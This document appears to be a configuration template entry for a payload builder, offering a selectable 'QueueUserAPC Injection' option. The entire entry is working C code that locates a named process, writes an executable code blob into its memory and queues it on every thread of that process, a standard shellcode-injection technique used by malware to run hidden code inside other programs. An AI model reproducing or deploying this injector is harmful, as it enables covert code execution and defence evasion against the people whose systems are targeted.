    display: QueueUserAPC Injection
    default: false
    snippet: |
      // QueueUserAPC injection into target process
      {
          HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
          if (hSnap != INVALID_HANDLE_VALUE) {
              PROCESSENTRY32W pe32 = {sizeof(pe32)};
              DWORD targetPid = 0;
              if (Process32FirstW(hSnap, &pe32)) {
                  do {
                      if (_wcsicmp(pe32.szExeFile, L"$psname$") == 0) {
                          targetPid = pe32.th32ProcessID;
                          break;
                      }
                  } while (Process32NextW(hSnap, &pe32));
              }
              
              if (targetPid) {
                  HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
                  if (hProc) {
                      LPVOID remoteMem = VirtualAllocEx(hProc, NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                      if (remoteMem) {
                          SIZE_T written;
                          if (WriteProcessMemory(hProc, remoteMem, code_blob, code_blob_len, &written)) {
                              THREADENTRY32 te32 = {sizeof(te32)};
                              if (Thread32First(hSnap, &te32)) {
                                  do {
                                      if (te32.th32OwnerProcessID == targetPid) {
                                          HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
                                          if (hThread) {
                                              QueueUserAPC((PAPCFUNC)remoteMem, hThread, 0);
                                              CloseHandle(hThread);
                                          }
                                      }
                                  } while (Thread32Next(hSnap, &te32));
                              }
                          }
                      }
                      CloseHandle(hProc);
                  }
              }
              CloseHandle(hSnap);
          }
      }

